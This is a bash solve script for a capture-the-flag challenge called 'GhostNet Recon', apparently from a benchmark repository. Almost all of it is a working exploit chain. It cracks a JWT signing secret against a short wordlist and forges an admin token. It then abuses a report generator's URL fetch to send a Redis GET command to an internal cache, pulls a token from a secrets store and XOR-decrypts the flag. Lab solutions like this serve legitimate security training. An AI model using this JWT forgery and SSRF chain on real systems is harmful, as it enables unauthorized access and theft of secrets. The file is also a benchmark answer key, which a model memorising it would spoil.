#!/usr/bin/env bash
# APEX-051-25 — "GhostNet Recon" (tags: jwt_crack, ssrf, redis, xor_decrypt)
#
# The router publishes a real API and two honeypots, and the honeypots hand out
# `FLAG{nice_try_this_is_a_decoy}` to anybody who asks. Everything here therefore
# has to be checked against the flag the runner supplied rather than against
# anything flag-shaped, which is the reason this repository insists on that.
#
# The chain is four turns of the same handle. A registered account's token is
# signed HS256 with a secret from a very short list, so the token can be
# rewritten rather than stolen. An administrator's report generator fetches a
# URL, and it speaks to Redis over what it thinks is HTTP — `/GET/<key>` is a
# command — which yields the token the secrets store wants. The store then hands
# over the flag XOR'd under a key it describes as "the same key used for JWT
# signing", which is the secret cracked in step one.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex051-$$"
WHO="ghost$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/v2/auth/register \
    --set header.Content-Type=application/json \
    --set "json.username=$WHO" --set json.password=probe123 \
    --set "json.email=$WHO@example.test" >/dev/null
TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/v2/auth/login \
    --set header.Content-Type=application/json \
    --set "json.username=$WHO" --set json.password=probe123 |
    body | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')"

# A short wordlist is enough, and the secret is also the XOR key later on.
SECRET="$(python3 -c '
import base64, hashlib, hmac, sys
head, payload, signature = sys.argv[1].split(".")
signed = f"{head}.{payload}"
for guess in ["secret", "secret123", "password", "123456", "jwt_secret",
              "changeme", "admin", "key", "supersecret", "mysecret"]:
    mine = base64.urlsafe_b64encode(
        hmac.new(guess.encode(), signed.encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    if mine == signature:
        print(guess)
        break
' "$TOKEN")"

ADMIN="$(python3 -c '
import base64, hashlib, hmac, json, sys, time
b64 = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
part = lambda obj: b64(json.dumps(obj, separators=(",", ":")).encode())
signed = part({"alg": "HS256", "typ": "JWT"}) + "." + part({
    "exp": int(time.time()) + 86400, "iat": int(time.time()),
    "role": "admin", "user_id": 1, "username": "admin",
})
print(signed + "." + b64(hmac.new(sys.argv[1].encode(), signed.encode(),
                                  hashlib.sha256).digest()))
' "$SECRET")"

# The report generator's fetch, aimed at Redis, with the path as the command.
INTERNAL="$(send "$SESSION" req_0 --create \
    --set path=/api/v2/admin/reports/generate \
    --set 'query.template_url=http://real-cache:6379/GET/secrets_store_token' \
    --set "header.Authorization=Bearer $ADMIN" |
    body | python3 -c 'import json,sys; print(json.load(sys.stdin)["template_data"]["value"])')"

send "$SESSION" req_0 --create \
    --set path=/api/v2/admin/reports/generate \
    --set 'query.template_url=http://secrets-store:5000/api/secrets/flag' \
    --set "header.Authorization=Bearer $ADMIN" \
    --set "header.X-Internal-Token=$INTERNAL" |
    body | python3 -c '
import base64, json, sys
blob = json.load(sys.stdin)["template_data"]["value"]
key = sys.argv[1].encode()
raw = base64.b64decode(blob)
print("".join(chr(byte ^ key[at % len(key)]) for at, byte in enumerate(raw)))
' "$SECRET" | flag
